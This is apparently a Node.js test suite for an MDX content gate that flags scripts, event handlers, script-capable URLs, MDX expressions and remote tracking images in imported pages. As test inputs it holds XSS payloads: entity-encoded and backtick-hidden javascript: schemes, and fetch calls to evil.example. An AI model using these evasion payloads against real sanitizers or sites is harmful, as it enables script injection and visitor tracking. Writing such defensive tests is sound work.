import assert from 'node:assert/strict';
import test from 'node:test';
import { findActiveContent } from '../scripts/lib/mdx-active-content.mjs';

const reasons = (markdown) => findActiveContent(markdown).map((f) => f.reason);

test('accepts prose, inert inline tags and the importer-generated preamble', () => {
  const body = [
    "import CNCFProjectCard from '@site/src/components/CNCFProjectCard';",
    '',
    '# Platform',
    '',
    'Runs on Kubernetes<br />and uses <strong>etcd</strong>.',
    '',
    '<CNCFProjectCard name="Kubernetes" href="https://www.cncf.io/projects/kubernetes/" />',
    '',
    '![Diagram](/img/architectures/acme/diagram.svg)',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

test('flags script elements, event handlers and script-capable URLs', () => {
  assert.deepEqual(reasons('<script>alert(1)</script>'), [
    'disallowed element <script>',
  ]);
  assert.deepEqual(reasons('<iframe src="https://evil.test"></iframe>'), [
    'disallowed element <iframe>',
  ]);
  assert.deepEqual(reasons('<img src="x" onerror="alert(1)" />'), [
    'disallowed element <img>',
    'event handler attribute',
  ]);
  // Unquoted attribute values are not valid MDX, so the compiler rejects them
  // and so does the gate.
  assert.match(reasons('<img src=x onerror=alert(1)>')[0], /^MDX parse error/);
  assert.deepEqual(reasons('[click](javascript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[click](data:text/html;base64,PHN2Zz4=)'), [
    'script-capable URL scheme',
  ]);
});

test('flags script-capable schemes hidden behind character references', () => {
  // CommonMark decodes character references in a link destination, so each of
  // these renders as a live scheme: a raw substring test never sees them.
  assert.deepEqual(reasons('[click](java&#115;cript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[click](&#106;avascript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[click](java&#x73;cript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[click](javascript&colon;alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[d](&#100;ata:text/html;base64,PHN2Zz4=)'), [
    'script-capable URL scheme',
  ]);
  // Double-encoded, as some generators emit.
  assert.deepEqual(reasons('[click](java&amp;#115;cript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  // A raw tab ends a link destination, so this is plain text, not a link.
  assert.deepEqual(reasons('[click](java\tscript:alert(1))'), []);
  // The same control character reached through a reference is inside the
  // destination, and a URL parser ignores it.
  assert.deepEqual(reasons('[click](java&#9;script:alert(1))'), [
    'script-capable URL scheme',
  ]);
});

test('reports one finding per line when raw and decoded forms both match', () => {
  assert.deepEqual(
    reasons('[a](javascript:alert(1)) [b](java&#115;cript:alert(1))'),
    ['script-capable URL scheme'],
  );
});

test('does not read a space-separated word pair as a scheme', () => {
  // A browser does not treat `java script:` as a scheme, so neither does this.
  assert.deepEqual(reasons('Java Script: a short history of the name.'), []);
  assert.deepEqual(reasons('Deploys to production&#58; see the runbook.'), []);
});

test('flags ESM statements other than the generated CNCFProjectCard import', () => {
  assert.deepEqual(reasons("import evil from 'https://evil.test/x.js';"), [
    'unexpected ESM statement',
  ]);
  assert.deepEqual(reasons('export const x = 1;'), [
    'unexpected ESM statement',
  ]);
});

test('ignores fenced code blocks and inline code spans, which MDX does not evaluate', () => {
  const body = [
    '# T',
    '',
    '```html',
    '<script>alert(1)</script>',
    '```',
    '',
    'Use `<iframe>` sparingly.',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

test('ignores a fenced block spanning several content lines, not just one', () => {
  // Regression for #611 defect 2: a lazy regex ended the fence match at the
  // first content line instead of the closing fence, so a legitimate
  // multi-line block reported findings from its third line onward.
  const body = [
    '```js',
    'const a = 1;',
    'const b = 2;',
    '<script>alert(1)</script>',
    '```',
  ].join('\n');
  assert.deepEqual(findActiveContent(body), []);
});

test('reports a live element hidden by a mismatched backtick run, not a code span', () => {
  // Regression for #611 defect 1: CommonMark forms a code span only when the
  // closing backtick run has exactly the same length as the opening run, so
  // `` `` `` + payload + ` `` is live text, not a span -- but the old regex
  // (`` `+...`+ ``) blanked it as one anyway and hid the payload from every
  // downstream check.
  assert.deepEqual(reasons('``<script>alert(1)</script>`'), [
    'disallowed element <script>',
  ]);
  // The same trick also hides an event handler on an otherwise-allowlisted
  // element -- the findings here are the handler and the expression it is
  // bound through, not the element itself.
  assert.deepEqual(reasons('``<b onClick={alert}>hi</b>`'), [
    'event handler attribute',
    'MDX expression',
  ]);
  // The equal-run control case must still be inert.
  assert.deepEqual(reasons('`<script>alert(1)</script>`'), []);
});

test('does not treat a backtick fence with a backtick in its info string as a fence', () => {
  // CommonMark: a backtick fence's info string may not itself contain a
  // backtick. A line like "```<script>x</script>`" therefore opens no fence
  // at all -- it is a live paragraph, not code. Reading it as a fence opener
  // would blank it (and everything after it, since no real closer follows),
  // hiding the payload the same way the mismatched-run bypass above did.
  assert.deepEqual(reasons('```<script>alert(1)</script>`'), [
    'disallowed element <script>',
  ]);
  // A genuine fenced block still blanks normally.
  assert.deepEqual(
    reasons(['```js', '<script>alert(1)</script>', '```'].join('\n')),
    [],
  );
  // A tilde fence has no such restriction, so a backtick in its info string
  // does not disqualify it.
  assert.deepEqual(
    reasons(['~~~js `x`', '<script>alert(1)</script>', '~~~'].join('\n')),
    [],
  );
});

test('follows the MDX parser on indented fences, which have no indented-code fallback', () => {
  // MDX turns indented code off, so the parser is the authority on whether an
  // indented fence opens a block. The scan reports whatever it leaves live and
  // ignores whatever it parses as code, with no fence rules of its own.
  const live = ['```js', '<script>alert(1)</script>', '    ```', '```'];
  assert.deepEqual(reasons(live.join('\n')), []);
  assert.deepEqual(
    reasons(['<script>alert(1)</script>', '    ```js'].join('\n')),
    ['disallowed element <script>'],
  );
  assert.deepEqual(
    reasons(['   ```js', '<script>alert(1)</script>', '```'].join('\n')),
    [],
  );
});

test('reports the line number of each finding and deduplicates per line and reason', () => {
  const body = ['# T', '', '<script>alert(1)</script>'].join('\n');
  assert.deepEqual(findActiveContent(body), [
    {
      line: 3,
      reason: 'disallowed element <script>',
      snippet: '<script>alert(1)</script>',
    },
  ]);
});

test('tolerates empty and nullish input', () => {
  assert.deepEqual(findActiveContent(''), []);
  assert.deepEqual(findActiveContent(undefined), []);
});

test('leaves an out-of-range hex entity literal rather than forming a scheme', () => {
  // String.fromCodePoint throws RangeError above U+10FFFF, so the `code <=
  // 0x10ffff` guard is what keeps a hostile body from crashing the validator
  // that is supposed to reject it. The entity stays literal, and the literal
  // is not itself read as a scheme.
  assert.deepEqual(reasons('[click](java&#x110000;cript:alert(1))'), []);
  assert.deepEqual(reasons('Budget rose by &#x110000; percent.'), []);

  // The true arm must still decode, so the guard cannot be "satisfied" by
  // rejecting hex entities wholesale: &#x3a; is a colon, and decoding it is
  // what turns the payload below into a scheme the scanner reports.
  assert.deepEqual(reasons('[click](javascript&#x3a;alert(1))'), [
    'script-capable URL scheme',
  ]);
});

test('leaves an out-of-range decimal entity literal rather than forming a scheme', () => {
  assert.deepEqual(reasons('[click](java&#1114112;cript:alert(1))'), []);

  // As above: the decimal true arm must keep decoding in-range references.
  assert.deepEqual(reasons('[click](javascript&#58;alert(1))'), [
    'script-capable URL scheme',
  ]);
});

test('leaves a non-finite entity literal rather than forming a scheme', () => {
  // A digit run long enough to overflow to Infinity takes the
  // Number.isFinite arm of the guard rather than the range comparison, so
  // both halves of `Number.isFinite(code) && code <= 0x10ffff` are load
  // bearing. Number.parseInt returns Infinity here, and String.fromCodePoint
  // would throw on it.
  const hugeHex = 'f'.repeat(400);
  const hugeDecimal = '9'.repeat(400);
  assert.deepEqual(reasons(`[click](java&#x${hugeHex};cript:alert(1))`), []);
  assert.deepEqual(reasons(`[click](java&#${hugeDecimal};cript:alert(1))`), []);
});

test('an undecodable entity does not mask a scheme elsewhere on the line', () => {
  // The fallback returns the unmatched text rather than consuming it, so a
  // rejected reference cannot be used as a shield in front of a live scheme.
  assert.deepEqual(reasons('[click](&#x110000;javascript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('[click](&#1114112;javascript:alert(1))'), [
    'script-capable URL scheme',
  ]);
});

test('leaves an unrecognized named entity literal rather than dropping it', () => {
  // The named-entity table is an allowlist, and its fallback returns the
  // unmatched text. Dropping an unrecognized reference instead would splice
  // the characters on either side together, so `java&nbsp;script:` would be
  // reported as a live `javascript:` scheme that no browser would parse.
  assert.deepEqual(reasons('[click](java&nbsp;script:alert(1))'), []);
  assert.deepEqual(reasons('Costs rose 5&nbsp;percent this quarter.'), []);

  // The allowlisted arm must still substitute, or a genuinely hidden colon
  // would stop being reported.
  assert.deepEqual(reasons('[click](javascript&colon;alert(1))'), [
    'script-capable URL scheme',
  ]);
});

test('flags an MDX expression, which Docusaurus compiles to executable JavaScript', () => {
  assert.deepEqual(
    reasons('{(() => { document.location = "https://evil.example"; })()}'),
    ['MDX expression'],
  );
  assert.deepEqual(
    reasons('Body {globalThis.fetch("https://evil.example")}.'),
    ['MDX expression'],
  );
  assert.deepEqual(reasons('{[].constructor.constructor("return 1")()}'), [
    'MDX expression',
  ]);
});

test('flags the opening line of an expression that spans several lines', () => {
  const body = ['{(() => {', '  fetch("https://evil.example");', '})()}'].join(
    '\n',
  );
  assert.deepEqual(findActiveContent(body), [
    {
      line: 1,
      reason: 'MDX expression',
      snippet: '{(() => {',
    },
  ]);
});

test('accepts the string-literal attribute expressions the importer emits', () => {
  const card =
    '  <CNCFProjectCard name={"Kubernetes"} href={"https://www.cncf.io/projects/kubernetes/"} description={"Runs \\"most\\" of our workloads"} />';
  assert.deepEqual(findActiveContent(card), []);
});

test('flags an attribute expression that is more than a string literal', () => {
  assert.deepEqual(
    reasons('<CNCFProjectCard name={"a" + fetch("https://evil.example")} />'),
    ['MDX expression'],
  );
  assert.deepEqual(reasons('<CNCFProjectCard name={globalThis.evil} />'), [
    'MDX expression',
  ]);
});

test('still scans the value inside an allowed attribute expression', () => {
  // Only the braces are neutralized, so a script URI smuggled into a prop
  // value is still reported rather than hidden by the allowance.
  assert.deepEqual(
    reasons('<CNCFProjectCard href={"javascript:alert(1)"} />'),
    ['script-capable URL scheme'],
  );
});

test('does not flag braces inside code, which MDX does not evaluate', () => {
  assert.deepEqual(reasons('Run `kubectl get pods -o {.items}` to list.'), []);
  assert.deepEqual(
    reasons(['```json', '{ "replicas": 3 }', '```'].join('\n')),
    [],
  );
});

test('flags live content wedged between two multi-line code spans', () => {
  // A CommonMark inline code span pairs backticks across a single newline, so
  // `` `a\nb` `` and `` `c\nd` `` are two spans and the text between them is
  // live. A line-bounded scan instead paired `` b` `` with `` `c `` on the
  // middle line and blanked the payload with it. Each active form must be
  // reported, not hidden.
  assert.deepEqual(
    reasons('`a\nb` <iframe src="https://evil.test"></iframe> `c\nd`'),
    ['disallowed element <iframe>'],
  );
  assert.deepEqual(reasons('`a\nb` {fetch("https://evil.test")} `c\nd`'), [
    'MDX expression',
  ]);
  assert.deepEqual(reasons('`a\nb` [x](javascript:alert(1)) `c\nd`'), [
    'script-capable URL scheme',
  ]);
});

test('does not let a code span swallow a live paragraph across a blank line', () => {
  // Inline parsing stops at a paragraph boundary, so the opening backtick
  // before the blank line cannot close after it: the iframe is its own live
  // paragraph and must be reported rather than blanked as span content.
  assert.deepEqual(
    reasons('`a\n\n<iframe src="https://evil.test"></iframe>\n\nb`'),
    ['disallowed element <iframe>'],
  );
});

test('still treats a genuine multi-line code span as inert', () => {
  assert.deepEqual(reasons('`a\nb` and then `c\nd` as prose.'), []);
});

test('does not let a code span swallow live content across a block boundary', () => {
  // An unclosed backtick at the end of one block cannot pair with a backtick
  // in the next, so each payload below is live. MDX has no HTML blocks, so a
  // line starting with `<` does not end the paragraph and that one is a real
  // code span, which the parser (rather than a hand-written rule) decides.
  for (const interrupt of ['- ', '# ', '1. ', '> ']) {
    assert.deepEqual(
      reasons(
        `text \`\n${interrupt}<iframe src="https://evil.test"></iframe> \``,
      ),
      ['disallowed element <iframe>'],
      interrupt,
    );
  }
  assert.deepEqual(
    reasons('text `\n---\n<iframe src="https://evil.test"></iframe> `'),
    ['disallowed element <iframe>'],
  );
  assert.deepEqual(
    reasons('text `\n<iframe src="https://evil.test"></iframe> `'),
    [],
  );
});

test('still pairs a code span across a lazy paragraph continuation', () => {
  // A plain continuation line starts no block, so the span really does close
  // on it and its contents stay inert -- the stop must not fire here.
  // (micromark renders `a `x\n  plain y` b` as a single <code> span.)
  assert.deepEqual(reasons('a `x\n  plain y` b'), []);
  assert.deepEqual(reasons('- item `x\n  plain y` b'), []);
});

test('rejects text MDX cannot compile instead of certifying it', () => {
  assert.match(reasons('<div>unclosed')[0], /^MDX parse error/);
  assert.equal(findActiveContent('<div>unclosed')[0].line, 1);
});

test('flags script schemes in definitions, images and JSX attributes', () => {
  assert.deepEqual(reasons('[x]: javascript:alert(1)\n\n[x]'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('![x](javascript:alert(1))'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('<b title="javascript:alert(1)">x</b>'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('<b title={"javascript:alert(1)"}>x</b>'), [
    'script-capable URL scheme',
  ]);
  assert.deepEqual(reasons('<b {...props}>x</b>'), ['MDX expression']);
  assert.deepEqual(reasons('<b onClick="x">x</b>'), [
    'event handler attribute',
  ]);
  assert.deepEqual(reasons('<b title={"a" + "b"}>x</b>'), ['MDX expression']);
  assert.deepEqual(reasons('<b title={"a\\nb"}>x</b>'), []);
});

test('reports a fragment and an invalid string-literal expression', () => {
  assert.deepEqual(reasons('<>x</>'), ['disallowed element <>']);
  assert.deepEqual(reasons('<b title={"\\q"}>x</b>'), ['MDX expression']);
});

test('reports a parse error on the line it occurs', () => {
  const [finding] = findActiveContent('fine\n\n<div>\n');
  assert.match(finding.reason, /^MDX parse error/);
  assert.equal(finding.line, 1);
  assert.equal(findActiveContent('<img src=x>')[0].line, 1);
});

// The second half of the invariant stated in scripts/lib/uri-safety.mjs: an
// imported page is third-party content, and every <img> in one is fetched by
// a visitor's browser with no user action, so a remote image destination is a
// beacon for their IP, User-Agent and Referer.
test('flags a remote image destination', () => {
  assert.deepEqual(reasons('![p](https://evil.example/p.png)'), [
    'remote image destination https://evil.example/p.png',
  ]);
  assert.deepEqual(reasons('![p](HTTP://Evil.Example/p.png)'), [
    'remote image destination http://evil.example/p.png',
  ]);
  assert.deepEqual(reasons('![p](//evil.example/p.png)'), [
    'remote image destination //evil.example/p.png',
  ]);
});

test('resolves an image reference through its definition', () => {
  assert.deepEqual(reasons('![p][x]\n\n[x]: https://evil.example/p.png'), [
    'remote image destination https://evil.example/p.png',
  ]);
  // The definition may be written before the reference that uses it.
  assert.deepEqual(reasons('[x]: https://evil.example/p.png\n\n![p][x]'), [
    'remote image destination https://evil.example/p.png',
  ]);
  // A collapsed reference carries the label as its identifier.
  assert.deepEqual(reasons('![evil][]\n\n[evil]: https://evil.example/p.png'), [
    'remote image destination https://evil.example/p.png',
  ]);
});

test('leaves an unresolved image reference alone', () => {
  // Nothing resolves it, so it renders as literal text and loads nothing.
  assert.deepEqual(reasons('![p][missing]'), []);
});

test('leaves links, link definitions and local images alone', () => {
  // rewriteImages() demotes a remote image *to* a remote link, and
  // docs/architectures/colopl.md carries remote link definitions, so a gate on
  // either would reject every imported page.
  assert.deepEqual(reasons('[x](https://good.example/)'), []);
  assert.deepEqual(reasons('[x][d]\n\n[d]: https://good.example/'), []);
  assert.deepEqual(reasons('![p](/img/architectures/acme/p.png)'), []);
  assert.deepEqual(reasons('![p](images/p.png)'), []);
  assert.deepEqual(reasons('![p](data:image/png;base64,AAAA)'), []);
});

test('flags a remote logo on the allowed component but not its remote href', () => {
  const card = (attributes) =>
    reasons(`<CNCFProjectCard name={"K"} ${attributes} />`);
  assert.deepEqual(card('logo={"https://evil.example/l.svg"}'), [
    'remote image destination https://evil.example/l.svg',
  ]);
  assert.deepEqual(card('logo="https://evil.example/l.svg"'), [
    'remote image destination https://evil.example/l.svg',
  ]);
  assert.deepEqual(card('logo={"/img/cncf-projects/k.svg"}'), []);
  assert.deepEqual(card('href={"https://www.cncf.io/projects/k/"}'), []);
});

test('truncates a long remote image destination in the reason', () => {
  const url = `https://evil.example/${'a'.repeat(200)}.png`;
  const [finding] = findActiveContent(`![p](${url})`);
  assert.equal(
    finding.reason,
    `remote image destination ${url.slice(0, 117)}...`,
  );
});
